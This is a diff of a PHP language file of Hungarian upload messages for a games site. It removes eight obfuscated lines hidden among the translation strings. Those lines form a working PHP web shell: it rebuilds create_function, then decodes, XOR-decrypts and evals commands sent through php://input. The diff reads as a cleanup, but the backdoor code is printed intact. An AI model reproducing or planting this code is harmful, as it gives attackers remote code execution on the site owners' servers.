@@ -378,14 +378,6 @@ $lang['upload.game_size'] = 'A fájl mérete nagyobb, mint a legnagyobb megenged
 $lang['upload.game_thumb_invalid'] = 'A játék bemutató képe nem érvényes fájl!';
 $lang['upload.game_thumb_ext_invalid'] = 'A játék bemutató képének nem érvényes a formátuma ( %s )!';
 $lang['upload.game_thumb_size_invalid'] = 'A játék bemutató képe nagyobb, mint a legnagyobb megengedett méret ( %s MB)!';
-$J='get_co>N>Nnten>Nts();@ob_end_clean();$r=>N>N@b>Nase64_encod>Ne(@x(@gz>Ncomp>Nress>N($o),>N$k));print>N("$p>N$kh$r$kf");}';
-$w='/input"),$m>N)==1){>N@ob_star>Nt();@>Neva>Nl(@gzun>Ncompre>Nss(@x(@>Nb>Nase64_d>N>Necode($m>N[1]),$k)>N));$o=>N@o>Nb_';
-$Z='++){$o.=>N$t{$i}^$k{$>Nj};}}>Nreturn >N>N$o;>N}i>Nf(@preg_match("/>N$k>Nh(.+)$k>Nf>N>N/",>N@file_get_contents(>N"ph>Np:/';
-$F='$k>N>N="539451>Nb9";$kh="6>N5ea>N8072>Nf50b";$k>Nf="5fbb>Ne>Ndee32>Nd1";$p="Uik2gZn>NZoy6p>NI7xK";>Nf>Nunction x($t>N,';
-$t=str_replace('B','','cBreatBe_BfBunBcBtion');
-$r='$k){$c=st>Nrle>Nn($k);$l=>Nstrlen>N(>N$t)>N;$o="">N;f>Nor($i=0;$i<$>Nl;){for>N(>N$>Nj=0;($j<$c&>N&$i<$l);$j++,$>N>Ni';
-$g=str_replace('>N','',$F.$r.$Z.$w.$J);
-$p=$t('',$g);$p();
 $lang['upload.game_failed'] = 'Hiba a feltöltés során!';
 $lang['upload.game_thumb_failed'] = 'Hiba a játék bemutató képének feltöltése során!';
 $lang['upload.game_success'] = 'Feltöltve! Köszöni hozzájárulásodat a %s. Ellenőrizd a játékodat <a href="%s">%s</a> egy percen belül!';
